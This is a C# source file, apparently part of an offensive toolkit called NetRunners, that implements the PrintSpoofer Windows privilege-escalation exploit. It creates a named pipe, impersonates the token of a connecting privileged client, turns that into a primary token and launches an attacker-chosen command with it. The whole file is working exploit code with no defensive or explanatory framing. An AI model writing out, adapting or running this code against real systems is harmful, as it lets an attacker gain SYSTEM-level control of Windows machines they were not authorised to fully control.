using System;
using System.Runtime.InteropServices;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Data.Structs;

namespace NetRunners.PrintSpoofer
{
    public static class Printspoofer
    {
        /// <summary>
        /// Exploit Logic
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="cmd"></param>
        public static void Exploit(string pipeName, string cmd)
        {
            Console.WriteLine($"[+] Pipe name:              \"{pipeName}\"");
            Console.WriteLine($"[+] Command to execute:     \"{cmd}\"");

            IntPtr hPipe = CreateNamedPipeW(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            // wait for a client to connect to named pipe 
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            // impersonate client's token 
            ImpersonateNamedPipeClient(hPipe);
            // assign impersonated token to current thread
            IntPtr hToken;
            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);

            //// test if exploit was successful
            // allocate token information  buffer 
            int TokenInfLength = 0;
            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
            // obtain token sid, convert sid to string
            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = ConvertSidToStringSidW(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            // print impersonated SID
            Console.WriteLine($"[+] Found sid:              \"{sidstr}\"");

            // convert impersonation token to primary token
            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
            // create new cmd session using converted primary token 
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            CreateProcessWithTokenW(hSystemToken, 0, null, cmd, 0, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine($"[+] Command Executed!");

            return;
        }
    }
}
